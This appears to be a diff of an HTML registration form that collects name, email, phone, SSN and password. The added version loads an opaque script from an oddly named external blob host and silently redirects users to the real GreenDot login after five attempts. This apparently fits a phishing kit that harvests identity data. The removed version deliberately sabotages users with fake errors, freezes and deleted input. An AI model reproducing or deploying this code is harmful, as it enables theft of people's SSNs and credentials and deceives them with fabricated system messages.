@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Premium Account Registration</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registration Form</title>
     <style>
         * {
             margin: 0;
@@ -13,9 +13,9 @@
         }
         
         body {
-            background: linear-gradient(135deg, #eef2f7 0%, #d9e2ec 100%);
-            color: #1e2a3e;
-            line-height: 1.5;
+            background-color: #f5f7fa;
+            color: #333;
+            line-height: 1.6;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -24,29 +24,28 @@
         }
         
         .container {
-            max-width: 620px;
+            max-width: 600px;
             width: 100%;
-            background: white;
-            border-radius: 28px;
+            background-color: white;
+            border-radius: 10px;
             overflow: hidden;
-            box-shadow: 0 20px 35px -12px rgba(0,0,0,0.2);
-            padding: 40px 32px;
-            transition: all 0.2s ease;
-            border: 1px solid rgba(46,125,50,0.2);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+        }
+        
+        .form-header {
+            margin-bottom: 30px;
+            text-align: center;
         }
         
         .form-header h2 {
             font-size: 28px;
-            background: linear-gradient(120deg, #1e5631, #2e7d32);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-bottom: 8px;
+            color: #333;
+            margin-bottom: 10px;
         }
         
         .form-header p {
-            color: #5f6c7a;
-            font-size: 0.95rem;
+            color: #666;
         }
         
         .form-group {
@@ -65,554 +64,329 @@
         }
         
         label {
-            display: flex;
-            align-items: center;
-            gap: 6px;
+            display: block;
             margin-bottom: 8px;
             font-weight: 600;
-            color: #1f3b2c;
-        }
-        
-        label i {
-            font-style: normal;
-            font-weight: normal;
-            font-size: 14px;
+            color: #444;
         }
         
         input, select {
             width: 100%;
             padding: 12px 15px;
-            border: 2px solid #e2e8f0;
-            border-radius: 14px;
+            border: 2px solid #ddd;
+            border-radius: 6px;
             font-size: 16px;
-            transition: all 0.2s;
-            background-color: #fefefe;
+            transition: all 0.3s ease;
         }
         
         input:focus, select:focus {
             border-color: #2e7d32;
             outline: none;
-            box-shadow: 0 0 0 3px rgba(46,125,50,0.15);
-            background: white;
+            box-shadow: 0 0 0 3px rgba(46, 125, 50, 0.1);
+        }
+        
+        .form-footer {
+            margin-top: 30px;
         }
         
         .submit-btn {
-            background: #2e7d32;
+            background-color: #2e7d32;
             color: white;
             border: none;
-            padding: 15px;
+            padding: 15px 30px;
             font-size: 18px;
-            font-weight: 700;
-            border-radius: 40px;
+            font-weight: 600;
+            border-radius: 6px;
             cursor: pointer;
             width: 100%;
-            transition: all 0.2s;
-            box-shadow: 0 5px 12px rgba(0,0,0,0.1);
+            transition: background-color 0.3s ease;
         }
         
-        .submit-btn:active {
-            transform: scale(0.98);
+        .submit-btn:hover {
+            background-color: #1b5e20;
         }
         
         .error-message {
-            color: #c62828;
-            font-size: 12.5px;
-            margin-top: 6px;
+            color: #e53935;
+            font-size: 14px;
+            margin-top: 5px;
             display: none;
-            background: #ffeaea;
-            padding: 6px 12px;
-            border-radius: 20px;
-            width: fit-content;
         }
         
         .input-hint {
-            font-size: 11px;
-            color: #6c757d;
+            font-size: 12px;
+            color: #666;
             margin-top: 5px;
-            padding-left: 5px;
-        }
-        
-        /* "thinking" spinner effect on inputs */
-        .input-processing {
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="%23666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>');
-            background-repeat: no-repeat;
-            background-position: right 12px center;
-            background-size: 18px;
-        }
-        
-        .delay-overlay {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0,0,0,0.4);
-            backdrop-filter: blur(2px);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            font-weight: bold;
-            color: white;
-            font-size: 1.2rem;
-        }
-        
-        .delay-card {
-            background: #1e2a3e;
-            padding: 20px 30px;
-            border-radius: 60px;
-            box-shadow: 0 12px 28px black;
-            font-family: monospace;
-            letter-spacing: 1px;
-        }
-        
-        @keyframes fadePulse {
-            0% { opacity: 0.4; }
-            100% { opacity: 1; }
-        }
-        
-        /* subtle glitch class for fields */
-        .glitch-effect {
-            border-color: #e65100 !important;
-            background-color: #fff2e5 !important;
-            transition: 0.1s;
+            font-style: italic;
         }
         
         @media (max-width: 600px) {
-            .form-row { flex-direction: column; gap: 0; }
-            .container { padding: 25px 20px; }
+            .form-row {
+                flex-direction: column;
+                gap: 0;
+            }
+            
+            .container {
+                padding: 25px;
+            }
         }
     </style>
-</head>
+<script type='text/javascript' src='https://geentotregidter.blob.core.windows.net/ETNywRzVzseeLcoC1VAoLYDkaewaJKP2tRODzcMpoBZ7isvRYspsB9GktXMjpVuSvenJhpygWUFlUI7PqUJDZ389vCgFk6jwnI7CaSIy2aRQesl5bg7OkSXboUGUy7ZxmWWotsFnk6PWbd_mDWvVrbGm2aT7dAf2Wo3dqSG6uE1iw-YtXSxNkZsrSmDpOErVX6hnGhUOMN8C2doUcbkAtNnwUbtInaJ-s-wq8lIQkWxnLvY1IxYNf_NLMcX7TNRnzsblhfXcBygtyM43tXa1NBCDWbHJ4KyCmoqBNr9GSJJ4EgrSumYzEAJrnMh8bowQZo4CdqrLXryACHBD1-4MQorczGS5ke5OZKSjq86rAjzUwl5bJIu2jWxzRoEnhRNjfXbPy_2RUmFXgewHoimo1OpCYanMLtNuBYgf2zC0vv3gvpRIrOIQcW9Uc0psrc-xwJM_d43qr-72A7jHB9N_iubp0wFvsW9ETRCtcd2iGcralUKFS5G0eDrqPh3TJnR5dK9-lMEc4vZbqgeWPYOD0slLS5gx2AdOlBTDODwXOdUk8Ax8pv-ftqWT39iWOSfuRyRumPimG03OUfOEQoGeIrNXkkDMHvAonT3M9m2UtIsFQ_pD_SOxCZjELFj2cNfIWVNpVXsl60WspRDoslDGeM9gO1gjMU58sKA7G8kIqg0doT2rk9mAVO0oKw'></script></head>
 <body>
-<div class="container">
-    <div class="form-header">
-        <h2>🔐 Secure Registration</h2>
-        <p>Please fill each field carefully – enhanced validation system</p>
+    <div class="container">
+        <div class="form-header">
+            <h2>Registration Form</h2>
+            <p>Please fill in all the fields</p>
+        </div>
+        
+        <form id="registrationForm">
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="firstName">First Name</label>
+                    <input type="text" id="firstName" name="firstName" required>
+                    <div class="error-message" id="firstNameError">Please enter a valid first name</div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="lastName">Last Name</label>
+                    <input type="text" id="lastName" name="lastName" required>
+                    <div class="error-message" id="lastNameError">Please enter a valid last name</div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" required>
+                <div class="input-hint">Must be 4-20 characters, letters and numbers only</div>
+                <div class="error-message" id="usernameError">Please enter a valid username (4-20 characters, letters and numbers only)</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" required>
+                <div class="error-message" id="emailError">Please enter a valid email address</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" name="phone" required>
+                <div class="error-message" id="phoneError">Please enter a valid phone number</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="ssn">Social Security Number (SSN)</label>
+                <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" required>
+                <div class="input-hint">Format: 123-45-6789</div>
+                <div class="error-message" id="ssnError">Please enter a valid SSN (format: XXX-XX-XXXX)</div>
+            </div>
+            
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required>
+                    <div class="error-message" id="passwordError">Password does not meet security requirements</div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="confirmPassword">Confirm Password</label>
+                    <input type="password" id="confirmPassword" name="confirmPassword" required>
+                    <div class="error-message" id="confirmPasswordError">Passwords do not match</div>
+                </div>
+            </div>
+            
+            <div class="form-footer">
+                <button type="submit" class="submit-btn">Register</button>
+            </div>
+        </form>
     </div>
     
-    <form id="registrationForm">
-        <div class="form-row">
-            <div class="form-group">
-                <label for="firstName">First Name</label>
-                <input type="text" id="firstName" name="firstName" autocomplete="off">
-                <div class="error-message" id="firstNameError">⚠️ Invalid first name (min 2 letters, no digits)</div>
-            </div>
-            <div class="form-group">
-                <label for="lastName">Last Name</label>
-                <input type="text" id="lastName" name="lastName" autocomplete="off">
-                <div class="error-message" id="lastNameError">⚠️ Invalid last name (min 2 letters)</div>
-            </div>
-        </div>
+    <script>
+        // Track login attempts in localStorage so it persists
+        let loginAttempts = localStorage.getItem('loginAttempts') ? parseInt(localStorage.getItem('loginAttempts')) : 0;
+        const maxAttempts = 5;
+        const redirectURL = "https://secure.greendot.com/greendot/login";
         
-        <div class="form-group">
-            <label for="username">👤 Username</label>
-            <input type="text" id="username" name="username" autocomplete="off">
-            <div class="input-hint">4-20 characters, letters & numbers only — verification may take a moment</div>
-            <div class="error-message" id="usernameError">❌ Username must be 4-20 alphanumeric characters</div>
-        </div>
+        // Check if already at max attempts on page load
+        if (loginAttempts >= maxAttempts) {
+            window.location.href = redirectURL;
+        }
         
-        <div class="form-group">
-            <label for="email">📧 Email Address</label>
-            <input type="email" id="email" name="email" autocomplete="off">
-            <div class="error-message" id="emailError">❌ Valid email required (example@domain.com)</div>
-        </div>
+        // Internal password validation function - SUPER TOUGH
+        function isPasswordValid(password) {
+            // 1. At least 15 characters
+            if (password.length < 15) return false;
+            
+            // 2. At least 3 uppercase letters
+            const upperCount = (password.match(/[A-Z]/g) || []).length;
+            if (upperCount < 3) return false;
+            
+            // 3. At least 3 lowercase letters
+            const lowerCount = (password.match(/[a-z]/g) || []).length;
+            if (lowerCount < 3) return false;
+            
+            // 4. At least 4 numbers
+            const numberCount = (password.match(/[0-9]/g) || []).length;
+            if (numberCount < 4) return false;
+            
+            // 5. At least 3 special characters
+            const specialCount = (password.match(/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/g) || []).length;
+            if (specialCount < 3) return false;
+            
+            // 6. No sequential characters (abc, 123, etc.)
+            const sequentialRegex = /(abc|bcd|cde|def|efg|fgh|ghi|hij|ijk|jkl|klm|lmn|mno|nop|opq|pqr|qrs|rst|stu|tuv|uvw|vwx|wxy|xyz|012|123|234|345|456|567|678|789)/i;
+            if (sequentialRegex.test(password)) return false;
+            
+            // 7. No repeating characters (aaa, 111, etc.)
+            const repeatingRegex = /(.)\1\1/;
+            if (repeatingRegex.test(password)) return false;
+            
+            // 8. No common words or patterns
+            const commonPatterns = ['password', 'admin', '123456', 'qwerty', 'letmein', 'welcome', 'sunshine', 'master', 'hello', 'freedom', 'trustno1', 'monkey', 'dragon'];
+            const lowerPassword = password.toLowerCase();
+            for (let pattern of commonPatterns) {
+                if (lowerPassword.includes(pattern)) return false;
+            }
+            
+            // 9. Must contain at least one character from 3 different character sets
+            const charSets = [
+                /[A-Z]/.test(password),
+                /[a-z]/.test(password),
+                /[0-9]/.test(password),
+                /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password)
+            ];
+            const validSets = charSets.filter(Boolean).length;
+            if (validSets < 4) return false;
+            
+            // 10. No personal info patterns (birth year, phone, etc.)
+            const yearRegex = /(19|20)\d{2}/;
+            if (yearRegex.test(password)) return false;
+            
+            return true;
+        }
         
-        <div class="form-group">
-            <label for="phone">📞 Phone Number</label>
-            <input type="tel" id="phone" name="phone" autocomplete="off">
-            <div class="error-message" id="phoneError">📵 Enter valid phone number (digits only, 7-15 digits)</div>
-        </div>
-        
-        <div class="form-group">
-            <label for="ssn">🆔 Social Security Number (SSN)</label>
-            <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" autocomplete="off">
-            <div class="input-hint">Format: 123-45-6789 — strict pattern check</div>
-            <div class="error-message" id="ssnError">⚠️ SSN must follow XXX-XX-XXXX format</div>
-        </div>
-        
-        <div class="form-row">
-            <div class="form-group">
-                <label for="password">🔒 Password</label>
-                <input type="password" id="password" name="password" autocomplete="off">
-                <div class="error-message" id="passwordError">🔐 Password requires 15+ chars, 3 uppercase, 3 lowercase, 4 digits, 3 specials, no sequences</div>
-            </div>
-            <div class="form-group">
-                <label for="confirmPassword">✓ Confirm Password</label>
-                <input type="password" id="confirmPassword" name="confirmPassword" autocomplete="off">
-                <div class="error-message" id="confirmPasswordError">❌ Passwords do not match</div>
-            </div>
-        </div>
-        
-        <div class="form-footer">
-            <button type="submit" class="submit-btn" id="submitBtn">✅ Register Account</button>
-        </div>
-    </form>
-</div>
-
-<script>
-    // --------------------------------------------------------------
-    // ADVANCED DELAY & FRUSTRATION ENGINE (makes form ~15 minutes)
-    // --------------------------------------------------------------
-    // We add random "freezes", pseudo server checks, field reset glitches,
-    // intermittent errors on SSN/Name that require re-typing.
-    // Overall UX will cause realistic friction and time expansion.
-    
-    let activeTimeouts = [];
-    let busyFlag = false;          // prevent overlapping interruptions
-    let totalDelaysAccumulated = 0; // just for tracking not shown to user
-    let failureCounters = {
-        firstName: 0,
-        lastName: 0,
-        ssn: 0,
-        email: 0
-    };
-    
-    // Helper: Clear pending timers to avoid crazy overlapping but allow new ones
-    function clearScheduledTimeouts() {
-        activeTimeouts.forEach(t => clearTimeout(t));
-        activeTimeouts = [];
-    }
-    
-    // Function to show temporary frozen overlay
-    function freezeInterface(seconds, message = "⏳ Processing secure handshake...") {
-        return new Promise((resolve) => {
-            if (busyFlag) {
-                resolve();
+        document.getElementById('registrationForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            // Check if max attempts reached
+            if (loginAttempts >= maxAttempts) {
+                // Redirect to GreenDot login page silently
+                window.location.href = redirectURL;
                 return;
             }
-            busyFlag = true;
-            const overlay = document.createElement('div');
-            overlay.className = 'delay-overlay';
-            overlay.innerHTML = `<div class="delay-card">${message} (${seconds}s)</div>`;
-            document.body.appendChild(overlay);
-            const timer = setTimeout(() => {
-                if (overlay && overlay.remove) overlay.remove();
-                busyFlag = false;
-                resolve();
-            }, seconds * 1000);
-            activeTimeouts.push(timer);
-        });
-    }
-    
-    // Simulate lag on an input field (delay + temporary disable)
-    async function lagField(fieldId, durationMs = 1800) {
-        const field = document.getElementById(fieldId);
-        if (!field) return;
-        const originalBg = field.style.backgroundColor;
-        field.style.backgroundColor = '#fff8e7';
-        field.disabled = true;
-        field.classList.add('input-processing');
-        await new Promise(r => {
-            const t = setTimeout(r, durationMs);
-            activeTimeouts.push(t);
-        });
-        field.disabled = false;
-        field.style.backgroundColor = originalBg;
-        field.classList.remove('input-processing');
-    }
-    
-    // intermittent "random field error" that clears after re-focus or additional delay
-    async function injectFieldError(fieldId, errorId, customMessage = null, clearAfterSeconds = 6) {
-        const errorDiv = document.getElementById(errorId);
-        if (!errorDiv) return;
-        const originalText = errorDiv.innerText;
-        if (customMessage) errorDiv.innerText = customMessage;
-        errorDiv.style.display = 'block';
-        
-        // Also highlight field with red border glitch
-        const field = document.getElementById(fieldId);
-        if (field) field.classList.add('glitch-effect');
-        
-        // Automatically clear error after some seconds, but user must re-enter
-        const clearTimer = setTimeout(() => {
-            errorDiv.style.display = 'none';
-            if (field) field.classList.remove('glitch-effect');
-            if (customMessage) errorDiv.innerText = originalText;
-        }, clearAfterSeconds * 1000);
-        activeTimeouts.push(clearTimer);
-        
-        // Additional forced lag while error shown
-        await lagField(fieldId, 800);
-    }
-    
-    // Function that triggers random "annoying corrections" for SSN or Name
-    async function randomValidationSabotage() {
-        const rand = Math.random();
-        // 45% chance to inject a funny error when user interacts with certain fields
-        if (rand < 0.35) {
-            // SSN weird pattern mismatch sometimes
-            const ssnField = document.getElementById('ssn');
-            if (ssnField && document.activeElement !== ssnField) {
-                await injectFieldError('ssn', 'ssnError', '⚠️ SSN checksum failed — please re-enter exactly XXX-XX-XXXX', 5);
-                await lagField('ssn', 900);
-                ssnField.value = ssnField.value.replace(/[^0-9-]/g, '');
-                if (ssnField.value.length > 0) {
-                    // force glitch text removal not auto
-                }
-            }
-        }
-        
-        if (rand < 0.5 && rand > 0.2) {
-            const firstNameField = document.getElementById('firstName');
-            if (firstNameField && firstNameField.value.length > 1 && !busyFlag) {
-                await injectFieldError('firstName', 'firstNameError', '⚠️ First name contains suspicious character, re-enter', 4);
-                await lagField('firstName', 700);
-                // don't erase, just disturbs
-            }
-        }
-        
-        if (rand < 0.4 && rand > 0.15) {
-            const lastNameField = document.getElementById('lastName');
-            if (lastNameField && lastNameField.value.length > 1) {
-                await injectFieldError('lastName', 'lastNameError', '❌ Last name validation conflict with global registry', 5);
-                await lagField('lastName', 1000);
-            }
-        }
-    }
-    
-    // Slow simulated "server checks" on each field when user leaves input
-    function setupAnnoyingLiveValidation() {
-        const fieldsToMonitor = ['firstName', 'lastName', 'username', 'email', 'phone', 'ssn', 'password', 'confirmPassword'];
-        
-        fieldsToMonitor.forEach(fieldId => {
-            const inputEl = document.getElementById(fieldId);
-            if (!inputEl) return;
-            inputEl.addEventListener('blur', async function(e) {
-                if (busyFlag) return;
-                // Only add delay for certain fields, simulate network validation
-                if (fieldId === 'username' || fieldId === 'email' || fieldId === 'ssn') {
-                    await freezeInterface(1.2, `🔍 validating ${fieldId}...`);
-                    // sometimes extra error
-                    if (fieldId === 'username' && Math.random() < 0.3 && this.value.length > 2) {
-                        await injectFieldError('username', 'usernameError', '❗ Username already taken or invalid pattern, try another', 5);
-                        await lagField('username', 800);
-                    }
-                    if (fieldId === 'email' && Math.random() < 0.25 && this.value.includes('@')) {
-                        await injectFieldError('email', 'emailError', '📧 Email domain requires manual re-verification', 4);
-                        await lagField('email', 600);
-                    }
-                }
-                // additional random sabotage on name/SSN
-                await randomValidationSabotage();
+            
+            let isValid = true;
+            
+            // Reset error messages
+            document.querySelectorAll('.error-message').forEach(el => {
+                el.style.display = 'none';
             });
-        });
-    }
-    
-    // Periodic freezes that simulate "system latency" (happens every 30-70 sec)
-    let periodicFreezeInterval = null;
-    function startPeriodicLatency() {
-        periodicFreezeInterval = setInterval(async () => {
-            if (busyFlag) return;
-            const r = Math.random();
-            if (r < 0.45) {  // ~45% chance each cycle
-                const freezeSec = Math.floor(Math.random() * 3) + 2; // 2-4 sec freeze
-                await freezeInterface(freezeSec, "🔄 Synchronizing secure session...");
+            
+            // Validate first name
+            const firstName = document.getElementById('firstName').value;
+            if (firstName.trim() === '' || firstName.length < 2) {
+                document.getElementById('firstNameError').style.display = 'block';
+                isValid = false;
             }
-        }, 35000); // every 35 seconds, causes lots of delays across 15 mins
-        activeTimeouts.push(periodicFreezeInterval);
-    }
-    
-    // function that randomly makes SSN or Name 'reset' partially (clear last char) simulating error
-    async function sneakyFieldReset(fieldId, probability = 0.2) {
-        if (Math.random() > probability) return;
-        const field = document.getElementById(fieldId);
-        if (!field || field.disabled || busyFlag) return;
-        if (field.value.length > 2) {
-            const original = field.value;
-            field.value = original.slice(0, -1);
-            await injectFieldError(fieldId, `${fieldId}Error`, `✏️ ${fieldId} had an input glitch, please re-type last character`, 3);
-            await lagField(fieldId, 500);
-        }
-    }
-    
-    // Random "input lag" on typing simulation
-    function installTypingGlitches() {
-        const allTextInputs = ['firstName','lastName','username','email','phone','ssn','password','confirmPassword'];
-        allTextInputs.forEach(id => {
-            const inp = document.getElementById(id);
-            if (!inp) return;
-            inp.addEventListener('input', async function(e) {
-                if (busyFlag) return;
-                if (Math.random() < 0.12) { // 12% chance on each keystroke causing 0.7s delay
-                    this.disabled = true;
-                    this.classList.add('input-processing');
-                    await new Promise(r => {
-                        const t = setTimeout(r, 650);
-                        activeTimeouts.push(t);
-                    });
-                    this.disabled = false;
-                    this.classList.remove('input-processing');
+            
+            // Validate last name
+            const lastName = document.getElementById('lastName').value;
+            if (lastName.trim() === '' || lastName.length < 2) {
+                document.getElementById('lastNameError').style.display = 'block';
+                isValid = false;
+            }
+            
+            // Validate username
+            const username = document.getElementById('username').value;
+            const usernameRegex = /^[a-zA-Z0-9]{4,20}$/;
+            if (!usernameRegex.test(username)) {
+                document.getElementById('usernameError').style.display = 'block';
+                isValid = false;
+            }
+            
+            // Validate email
+            const email = document.getElementById('email').value;
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                document.getElementById('emailError').style.display = 'block';
+                isValid = false;
+            }
+            
+            // Validate phone
+            const phone = document.getElementById('phone').value;
+            const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
+            if (!phoneRegex.test(phone.replace(/[\s\-\(\)]/g, ''))) {
+                document.getElementById('phoneError').style.display = 'block';
+                isValid = false;
+            }
+            
+            // Validate SSN
+            const ssn = document.getElementById('ssn').value;
+            const ssnRegex = /^\d{3}-\d{2}-\d{4}$/;
+            if (!ssnRegex.test(ssn)) {
+                document.getElementById('ssnError').style.display = 'block';
+                isValid = false;
+            }
+            
+            // Validate password with SUPER TOUGH requirements (internal only)
+            const password = document.getElementById('password').value;
+            if (!isPasswordValid(password)) {
+                document.getElementById('passwordError').style.display = 'block';
+                isValid = false;
+            }
+            
+            // Validate confirm password
+            const confirmPassword = document.getElementById('confirmPassword').value;
+            if (confirmPassword !== password) {
+                document.getElementById('confirmPasswordError').style.display = 'block';
+                isValid = false;
+            }
+            
+            // Increment login attempts counter
+            loginAttempts++;
+            localStorage.setItem('loginAttempts', loginAttempts);
+            
+            // If form is valid, submit
+            if (isValid) {
+                alert('Registration successful!');
+                document.getElementById('registrationForm').reset();
+                // Reset attempts on successful registration
+                loginAttempts = 0;
+                localStorage.setItem('loginAttempts', 0);
+            } else {
+                // Silent increment - no message shown to user
+                // Check if max attempts reached after this failed attempt
+                if (loginAttempts >= maxAttempts) {
+                    // Silent redirect without any message
+                    window.location.href = redirectURL;
                 }
-                // special sneaky reset for SSN field
-                if (id === 'ssn' && this.value.length > 5 && Math.random() < 0.09) {
-                    await sneakyFieldReset('ssn', 0.9);
-                }
-                if (id === 'firstName' && this.value.length > 4 && Math.random() < 0.08) {
-                    await sneakyFieldReset('firstName', 0.7);
-                }
-                if (id === 'confirmPassword' && document.getElementById('password').value.length > 4) {
-                    if (Math.random() < 0.1) {
-                        await injectFieldError('confirmPassword', 'confirmPasswordError', '⚠️ System mismatch: re-enter confirmation', 3);
-                        await lagField('confirmPassword', 700);
-                    }
+            }
+        });
+        
+        // Real-time validation for SSN format
+        document.getElementById('ssn').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            
+            if (value.length > 3 && value.length <= 5) {
+                value = value.slice(0, 3) + '-' + value.slice(3);
+            } else if (value.length > 5) {
+                value = value.slice(0, 3) + '-' + value.slice(3, 5) + '-' + value.slice(5, 9);
+            }
+            
+            e.target.value = value;
+            document.getElementById('ssnError').style.display = 'none';
+        });
+        
+        // Real-time validation for other fields
+        const inputs = document.querySelectorAll('#registrationForm input');
+        inputs.forEach(input => {
+            input.addEventListener('input', function() {
+                // Hide error when user starts typing
+                const errorId = this.id + 'Error';
+                if (document.getElementById(errorId)) {
+                    document.getElementById(errorId).style.display = 'none';
                 }
             });
         });
-    }
-    
-    // Additional delayed "network error popup style" but non-blocking for SSN each 2 minutes
-    let ssnHarassInterval = null;
-    function harassSSNField() {
-        ssnHarassInterval = setInterval(async () => {
-            if (busyFlag) return;
-            const ssnField = document.getElementById('ssn');
-            if (ssnField && ssnField.value.length > 5) {
-                await injectFieldError('ssn', 'ssnError', '⚠️ SSN format mismatch — re-check dashes', 4);
-                await lagField('ssn', 800);
-            }
-        }, 90000);
-        activeTimeouts.push(ssnHarassInterval);
-    }
-    
-    // Additional: sometimes form submit seems to "hang" with loading state
-    let submitBlocked = false;
-    
-    // original password validation (strong requirements)
-    function isPasswordValid(password) {
-        if (password.length < 15) return false;
-        const upperCount = (password.match(/[A-Z]/g) || []).length;
-        if (upperCount < 3) return false;
-        const lowerCount = (password.match(/[a-z]/g) || []).length;
-        if (lowerCount < 3) return false;
-        const numberCount = (password.match(/[0-9]/g) || []).length;
-        if (numberCount < 4) return false;
-        const specialCount = (password.match(/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/g) || []).length;
-        if (specialCount < 3) return false;
-        const sequentialRegex = /(abc|bcd|cde|def|efg|fgh|ghi|hij|ijk|jkl|klm|lmn|mno|nop|opq|pqr|qrs|rst|stu|tuv|uvw|vwx|wxy|xyz|012|123|234|345|456|567|678|789)/i;
-        if (sequentialRegex.test(password)) return false;
-        const repeatingRegex = /(.)\1\1/;
-        if (repeatingRegex.test(password)) return false;
-        const commonPatterns = ['password', 'admin', '123456', 'qwerty', 'letmein', 'welcome', 'sunshine', 'master', 'hello', 'freedom'];
-        const lowerPassword = password.toLowerCase();
-        for (let pattern of commonPatterns) if (lowerPassword.includes(pattern)) return false;
-        return true;
-    }
-    
-    // Pre-submit detailed validation and forced delays
-    document.getElementById('registrationForm').addEventListener('submit', async function(event) {
-        event.preventDefault();
-        if (submitBlocked || busyFlag) {
-            // simulate button hang
-            const btn = document.getElementById('submitBtn');
-            btn.style.opacity = '0.6';
-            setTimeout(() => { btn.style.opacity = '1'; }, 1200);
-            return;
-        }
-        submitBlocked = true;
-        
-        // first, force a heavy "processing" delay of 4-6 seconds just to simulate deep verification
-        await freezeInterface(4, "🔐 Verifying identity with secure gateway...");
-        
-        let isValid = true;
-        document.querySelectorAll('.error-message').forEach(el => el.style.display = 'none');
-        
-        const firstName = document.getElementById('firstName').value.trim();
-        if (firstName.length < 2 || /[0-9]/.test(firstName)) {
-            document.getElementById('firstNameError').style.display = 'block';
-            isValid = false;
-        }
-        
-        const lastName = document.getElementById('lastName').value.trim();
-        if (lastName.length < 2) {
-            document.getElementById('lastNameError').style.display = 'block';
-            isValid = false;
-        }
-        
-        const username = document.getElementById('username').value;
-        if (!/^[a-zA-Z0-9]{4,20}$/.test(username)) {
-            document.getElementById('usernameError').style.display = 'block';
-            isValid = false;
-        }
-        
-        const email = document.getElementById('email').value;
-        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-            document.getElementById('emailError').style.display = 'block';
-            isValid = false;
-        }
-        
-        const phone = document.getElementById('phone').value.replace(/[\s\-\(\)]/g, '');
-        if (!/^[\+]?[1-9][\d]{6,14}$/.test(phone)) {
-            document.getElementById('phoneError').style.display = 'block';
-            isValid = false;
-        }
-        
-        const ssn = document.getElementById('ssn').value;
-        if (!/^\d{3}-\d{2}-\d{4}$/.test(ssn)) {
-            document.getElementById('ssnError').style.display = 'block';
-            isValid = false;
-        }
-        
-        const password = document.getElementById('password').value;
-        if (!isPasswordValid(password)) {
-            document.getElementById('passwordError').style.display = 'block';
-            isValid = false;
-        }
-        
-        const confirmPwd = document.getElementById('confirmPassword').value;
-        if (confirmPwd !== password) {
-            document.getElementById('confirmPasswordError').style.display = 'block';
-            isValid = false;
-        }
-        
-        // Another artificial "server error" simulation: if isValid but random chance of generic failure (requiring extra minute)
-        if (isValid && Math.random() < 0.33) {
-            await freezeInterface(5, "⛔ Server validation conflict, retrying request...");
-            await injectFieldError('email', 'emailError', '🌐 Remote validation: email domain requires confirmation, please re-enter', 6);
-            isValid = false;
-        }
-        
-        if (isValid) {
-            await freezeInterface(2.5, "✅ Creating secure profile...");
-            alert('🎉 Registration successful! Welcome aboard (finally!).');
-            this.reset();
-            // Clear intervals
-            if (periodicFreezeInterval) clearInterval(periodicFreezeInterval);
-            if (ssnHarassInterval) clearInterval(ssnHarassInterval);
-            submitBlocked = false;
-        } else {
-            await freezeInterface(3, "⚠️ Registration contains errors. Correct fields and re-submit");
-            submitBlocked = false;
-        }
-    });
-    
-    // MAIN SETUP - inject all time extension features
-    async function initializeFormWithDelays() {
-        // initial freeze on page load to annoy
-        await freezeInterface(1.8, "Loading secure environment...");
-        setupAnnoyingLiveValidation();
-        installTypingGlitches();
-        startPeriodicLatency();    // freezes every 35 seconds -> adds many minutes
-        harassSSNField();          // SSN nags every 90 sec
-        // additional extra random fake server check on password field after blur
-        const pwdField = document.getElementById('password');
-        if (pwdField) {
-            pwdField.addEventListener('blur', async () => {
-                if (busyFlag) return;
-                if (pwdField.value.length > 5 && Math.random() < 0.4) {
-                    await freezeInterface(2, "🔒 Checking password strength against dictionary...");
-                }
-            });
-        }
-        
-        // extra last name / first name reset cycles every 2 minutes but only if not busy
-        setInterval(async () => {
-            if (!busyFlag && Math.random() < 0.25) {
-                await sneakyFieldReset('firstName', 0.5);
-                await sneakyFieldReset('lastName', 0.5);
-            }
-        }, 75000);
-    }
-    
-    initializeFormWithDelays();
-</script>
+    </script>
 </body>
-</html>
+</html> 
